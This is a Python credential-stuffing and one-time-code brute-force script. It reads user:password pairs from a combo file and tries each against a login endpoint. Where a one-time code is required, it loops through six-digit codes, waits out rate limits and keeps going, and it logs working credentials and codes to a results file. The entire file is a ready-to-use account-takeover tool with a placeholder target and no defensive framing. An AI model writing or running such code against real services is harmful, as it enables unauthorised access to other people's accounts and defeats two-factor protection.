import requests
import time

# ===== CONFIGURATION =====
LOGIN_URL = "https://example.com/api/login"
OTP_URL = "https://example.com/api/verify-otp"
COMBO_FILE = "combo.txt"
OUTPUT_FILE = "valid.txt"

HEADERS = {
    "Content-Type": "application/json"
}

# =========================

with open(COMBO_FILE) as f:
    for line in f:
        line = line.strip()
        
        if not line or ":" not in line:
            continue
        
        user, pwd = line.split(":", 1)
        
        # Step 1: Login with password
        login_payload = {
            "username": user,
            "password": pwd
        }
        
        resp = requests.post(LOGIN_URL, json=login_payload, headers=HEADERS)
        
        if resp.status_code == 200 and resp.json().get("requires_otp"):
            print(f"🔐 OTP required for: {user}")
            
            # Step 2: Brute force OTP from 1111 to 999999
            for otp in range(1111, 1000000):
                otp_payload = {
                    "username": user,
                    "otp": str(otp).zfill(6)  # Formats as 6-digit (001234)
                }
                
                otp_resp = requests.post(OTP_URL, json=otp_payload, headers=HEADERS)
                
                if otp_resp.status_code == 200 and otp_resp.json().get("token"):
                    print(f"✅ VALID: {user}:{pwd} | OTP: {str(otp).zfill(6)}")
                    with open(OUTPUT_FILE, "a") as out:
                        out.write(f"{user}:{pwd} | OTP:{str(otp).zfill(6)}\n")
                    break
                elif otp_resp.status_code == 429:
                    print(f"⚠️ Rate limited. Waiting...")
                    time.sleep(60)
                
                # Optional: Show progress every 1000 attempts
                if otp % 1000 == 0:
                    print(f"   Trying OTP: {str(otp).zfill(6)}")
            
        elif resp.status_code == 200 and resp.json().get("token"):
            print(f"✅ VALID (no OTP): {user}:{pwd}")
            with open(OUTPUT_FILE, "a") as out:
                out.write(f"{user}:{pwd}\n")
        else:
            print(f"❌ INVALID: {user}")
